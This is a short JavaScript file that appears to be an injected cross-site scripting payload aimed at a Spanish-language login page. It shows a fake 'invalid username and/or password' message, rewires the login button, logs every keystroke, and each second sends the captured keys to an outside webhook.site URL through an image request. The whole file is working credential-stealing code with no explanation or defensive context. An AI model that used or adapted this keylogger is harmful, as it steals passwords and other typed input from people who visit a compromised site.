var keys='';
//var url = 'http://127.0.0.1:9001/?c=';
var url = 'https://webhook.site/e515e515-d6ce-4063-905b-b68b19b5bbf9?c=';

stepToLocal();
var a=document.getElementById("login-error");
a.innerHTML="Usuario y/o password no válidos";
var b=document.getElementById("login");
b.getElementsByTagName("button")[0].setAttribute("onclick","window.location='/'");
var get,key,keys = "";
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 1000);
